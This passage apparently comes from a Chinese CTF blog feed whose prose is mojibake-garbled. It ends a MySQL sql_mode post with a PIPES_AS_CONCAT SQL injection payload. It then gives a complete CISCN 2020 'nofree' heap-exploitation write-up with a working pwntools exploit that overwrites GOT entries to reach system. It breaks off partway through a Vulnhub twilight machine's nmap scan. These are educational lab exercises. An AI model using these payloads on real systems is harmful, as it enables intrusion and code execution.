class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922200504284.png" alt="image-20200922200504284" style="zoom:50%;" /><p>æ²¡æœ‰å¼€å¯<code>ERROR_FOR_DIVISION_BY_ZERO</code></p><p>å°è¯•æ’å…¥æ•°æ®</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922200707483.png" alt="image-20200922200707483"></p><p>æ²¡æœ‰æŠ¥é”™ï¼Œåªæ˜¯å˜æˆäº†<code>NULL</code></p><p>å¼€å¯<code>ERROR_FOR_DIVISION_BY_ZERO</code></p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922200852189.png" alt="image-20200922200852189" style="zoom:50%;" /><p>æ’å…¥ é™¤0çš„æ•°æ®</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922200955449.png" alt="image-20200922200955449"></p><p>æŠ¥é”™äº†</p><h3 id="NO-AUTO-CREATE-USER"><a href="#NO-AUTO-CREATE-USER" class="headerlink" title="NO_AUTO_CREATE_USER"></a>NO_AUTO_CREATE_USER</h3><h4 id="è§£é‡Šï¼Ÿ-4"><a href="#è§£é‡Šï¼Ÿ-4" class="headerlink" title="è§£é‡Šï¼Ÿ"></a>è§£é‡Šï¼Ÿ</h4><p><strong>é˜²æ­¢GRANTè‡ªåŠ¨åˆ›å»ºæ–°ç”¨æˆ·</strong>ï¼Œé™¤éè¿˜æŒ‡å®šäº†å¯†ç ã€‚</p><blockquote><p>mysql8.0ä»¥å‰çš„ç‰ˆæœ¬å¯ä»¥ä½¿ç”¨grantåœ¨æˆæƒçš„æ—¶å€™éšå¼çš„åˆ›å»ºç”¨æˆ·ï¼Œ8.0ä»¥åå·²ç»ä¸æ”¯æŒï¼Œæ‰€ä»¥å¿…é¡»å…ˆåˆ›å»ºç”¨æˆ·ï¼Œç„¶åå†æˆæƒ</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE USER &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;Hadoop3!&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; grant all privileges on *.* to &#39;root&#39;@&#39;%&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br></pre></td></tr></table></figure><h3 id="PIPES-AS-CONCAT"><a href="#PIPES-AS-CONCAT" class="headerlink" title="PIPES_AS_CONCAT"></a>PIPES_AS_CONCAT</h3><h4 id="è§£é‡Šï¼Ÿ-5"><a href="#è§£é‡Šï¼Ÿ-5" class="headerlink" title="è§£é‡Šï¼Ÿ"></a>è§£é‡Šï¼Ÿ</h4><p>å°†<code>&quot;||&quot;</code>è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œè¿™å’Œ<code>Oracle</code>æ•°æ®åº“æ˜¯ä¸€æ ·æ˜¯ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°<code>concat</code>ç›¸ç±»ä¼¼</p><h4 id="ä¸¾ä¾‹-1"><a href="#ä¸¾ä¾‹-1" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p>æ²¡æœ‰å¼€å¯<code>pipes_as_concat</code></p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922201755325.png" alt="image-20200922201755325" style="zoom:50%;" /><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1||id from users;</span><br></pre></td></tr></table></figure><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922201844660.png" alt="image-20200922201844660" style="zoom:50%;" /><p>æœç´¢çš„æ•°æ®å…¨æ˜¯<code>1</code>ï¼ˆ1||idï¼‰</p><p>å¼€å¯ä¹‹å</p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922201954474.png" alt="image-20200922201954474" style="zoom:50%;" /><p>ç»“æœç”±<code>1</code>å’Œ<code>id</code>æ‹¼æ¥è€Œæˆ</p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922202112951.png" alt="image-20200922202112951" style="zoom:50%;" /><p>æ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªå‚æ•°ï¼Œæ§åˆ¶<code>||</code>å®ç°æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_GET[&#39;code&#39;] || Flag from flag;</span><br></pre></td></tr></table></figure><p>å½“<code>code=1;set sql_mode=pipes_as_concat; select 1</code>çš„æ—¶å€™ï¼Œsqlè¯­å¥è¢«æ‹¼æ¥æˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1;set sql_mode&#x3D;pipes_as_concat; select 1 || Flag from flag;</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢çš„ä¾‹å­å¯å¾—ï¼Œä¼šè¾“å‡º<code>1</code>å’Œ<code>Flag</code>å­—æ®µå†…å®¹æ‹¼æ¥åçš„ç»“æœ</p><h2 id="æœªå®Œå¾…ç»­"><a href="#æœªå®Œå¾…ç»­" class="headerlink" title="æœªå®Œå¾…ç»­"></a>æœªå®Œå¾…ç»­</h2><p>ä¸»è¦æ˜¯æˆ‘æ‡’ï¼ˆ</p><p>ä¸‹æ¬¡ç»§ç»­å†™æ˜¯å•¥æ—¶å€™å‘¢ï¼ˆ</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscnåˆèµ›-nofree</title>
      <link href="/ciscn_nofree.html"/>
      <url>/ciscn_nofree.html</url>
      
        <content type="html"><![CDATA[<p>2020å¹´å›½èµ› åˆèµ›pwné¢˜</p><p>ç”±äºæˆ‘æ˜¯æ‡’ç‹—ï¼Œç°åœ¨æ‰æƒ³èµ·æ¥å†™wpï¼ˆ</p><a id="more"></a><h1 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h1><h2 id="æ£€æŸ¥ä¿æŠ¤"><a href="#æ£€æŸ¥ä¿æŠ¤" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤"></a>æ£€æŸ¥ä¿æŠ¤</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916171504771.png" alt="image-20200916171504771"></p><p>æ²¡æœ‰å¼€<code>pie</code>å’Œ<code>pelro</code></p><h2 id="åæ±‡ç¼–"><a href="#åæ±‡ç¼–" class="headerlink" title="åæ±‡ç¼–"></a>åæ±‡ç¼–</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbufs();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = menu();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    edit(a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009EF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Management:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1- New &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2- Edit&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;choice&gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> get_int();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¦‚æè¿°çš„é‚£æ ·ï¼Œæ²¡æœ‰<code>free</code>é€‰é¡¹</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    result = get_int();</span><br><span class="line">    v2 = result;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= <span class="number">144</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>] = get_content(result);</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šåˆ†é…ä¸€ä¸ªå †å—ï¼Œå¹¶ä¸”æŠŠ<code>size</code>å†™è¿›ç»“æ„ä½“</p><p>ä½†æ˜¯åˆ†é…å †å—çš„å¤§å°ï¼Œä¸æ˜¯ç”±<code>size</code>å†³å®šï¼Œè€Œæ˜¯ç”±<code>strlen(content)</code>å†³å®š</p><p>å¯¼è‡´äº†æº¢å‡º</p><p>å¹¶ä¸”åœ¨addçš„æ—¶å€™ï¼Œæ²¡æœ‰æ£€æŸ¥å †å—æ˜¯å¦å·²ç»å­˜åœ¨ï¼Œå¯¼è‡´æ— é™ç”³è¯·</p><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)&amp;heapArray[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)result + <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      result = sub_400916(*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®<code>size</code>å†³å®šï¼Œé…åˆ<code>add</code>å‡½æ•°é€ æˆäº†å †æº¢å‡º</p><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>æœ‰ä¸€ç§åˆ©ç”¨å †æº¢å‡ºå¯ä»¥åœ¨æ²¡æœ‰<code>free</code>å‡½æ•°çš„æƒ…å†µä¸‹å¾—åˆ°ä¸€ä¸ª<code>unsortedbin</code>å †å—ï¼ˆåŒç†ä¹Ÿå¯ä»¥å¾—åˆ°<code>fastbin</code></p><p>è¯¦æƒ…è¯·è§CTFwiki</p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><h3 id="ä¿®æ”¹topbin"><a href="#ä¿®æ”¹topbin" class="headerlink" title="ä¿®æ”¹topbin"></a>ä¿®æ”¹topbin</h3><p>é¦–å…ˆåˆ©ç”¨å †æº¢å‡ºä¿®æ”¹<code>topbin</code>çš„å¤§å°</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172303763.png" alt="image-20200916172303763"></p><p>è¿è¡Œä¹‹å</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172355480.png" alt="image-20200916172355480"></p><p><code>topbin</code>è¢«ä¿®æ”¹ä¸ºä¸€ä¸ªå°çš„å€¼</p><h3 id="å¾—åˆ°fastbin"><a href="#å¾—åˆ°fastbin" class="headerlink" title="å¾—åˆ°fastbin"></a>å¾—åˆ°fastbin</h3><p>æŠŠå‰©ä¸‹çš„topbinåˆ†é…æ‰ï¼Œç•™ä¸‹ä¸€ä¸ª<code>0x90</code>çš„å¤§å°</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172714541.png" alt="image-20200916172714541"></p><p>ç„¶ååˆ†é…ä¸€ä¸ªè¶…è¿‡å®ƒå¤§å°çš„å †å—ï¼Œè¿™ä¸ªå †å—å°±ä¼šè¿›å…¥<code>fastbin</code>(å¦åˆ™è¿›å…¥<code>unsortedbin</code>)</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172820568.png" alt="image-20200916172820568"></p><p>å¹¶ä¸”è¿™ä¸ª<code>fastbin</code>çš„<code>fd</code>æŒ‡é’ˆå¯æ§ï¼ˆå †æº¢å‡ºï¼‰</p><p>ä¿®æ”¹å®ƒä¸º<code>memset@got</code>çš„åœ°å€ï¼Œå°±å¯ä»¥ä¿®æ”¹<code>memset    </code>å‡½æ•°</p><p>è¿™é‡Œä¿®æ”¹æˆ<code>printf</code>ç„¶ååˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„æ¼libc</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173137032.png" alt="image-20200916173137032"></p><p>å¾—åˆ°äº†libcä¹‹ååœ¨é‡æ”¾ä¸€æ¬¡ä¸Šé¢çš„æ“ä½œä¿®æ”¹<code>atoi@got</code>ä¸º<code>system</code>æˆ–è€…<code>one_gadget</code>å³å¯</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173416122.png" alt="image-20200916173416122"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/shiroha/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0xfe1</span>))</span><br><span class="line">[add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a</span>)]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x71</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line"></span><br><span class="line">memset_addr = elf.got[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6021c0</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(memset_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(printf_plt))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x90</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\x30&#x27;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(<span class="string">&#x27;\x30&#x27;</span> + sh.recvuntil(<span class="string">&#x27;\x01&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;c ==&gt; &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">base = c - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">240</span></span><br><span class="line">print(<span class="string">&quot;base ==&gt; &quot;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line"><span class="comment"># one = [0x45226, 0x4527a, 0xf0364]</span></span><br><span class="line">edit(<span class="number">0</span>, p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">edit(<span class="number">1</span>, p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub sunset:twilighté¶æœº</title>
      <link href="/sunset-twilight.html"/>
      <url>/sunset-twilight.html</url>
      
        <content type="html"><![CDATA[<p>Vulnhub sunsetç³»åˆ—</p><a id="more"></a><h1 id="sunset-Twilight"><a href="#sunset-Twilight" class="headerlink" title="sunset:Twilight"></a>sunset:Twilight</h1><ul><li>é¶æœºip: <code>192.168.6.129</code></li><li>kali ip: <code>192.168.6.128</code></li></ul><h2 id="ç«¯å£æ‰«æç»“æœ"><a href="#ç«¯å£æ‰«æç»“æœ" class="headerlink" title="ç«¯å£æ‰«æç»“æœ"></a>ç«¯å£æ‰«æç»“æœ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 43:e9:45:ec:f4:5b:ed:e9:64:47:43:43:39:96:9d:c9 (RSA)</span><br><span class="line">|   256 ed:67:ad:31:04:17:ef:cf:75:02:05:db:88:94:97:a0 (ECDSA)</span><br><span class="line">|_  256 ed:41:e5:d1:b2:23:2c:d5:90:59:2a:37:8b:da:31:c1 (ED25519)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">| smtp-commands: twilight Hello nmap.scanme.org [192.168.6.128], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, </span><br><span class="line">|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP </span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--   1 root     root           35 Jul 16 12:21 22253251-65325.twilight</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|  Connected to: 192.168.6.129:2121</span><br><span class="line">|  Waiting for username.</span><br><span class="line">|  TYPE: ASCII; STRUcture: File; MODE: Stream</span><br><span class="line">|  Data connection closed.</span><br><span class="line">|_End of status.</span><br><span class="line">3306/tcp  open  mysql       MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">|   Thread ID: 38</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsCompression, SupportsLoadDataLocal, ODBCClient, IgnoreSigpipes, LongColumnFlag, FoundRows, Support41Auth, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: KGa5#NB&lt;G/R4L_w\H0YO</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">8080/tcp  open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">63525/tcp open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">MAC Address: 00:0C:29:16:3E:01 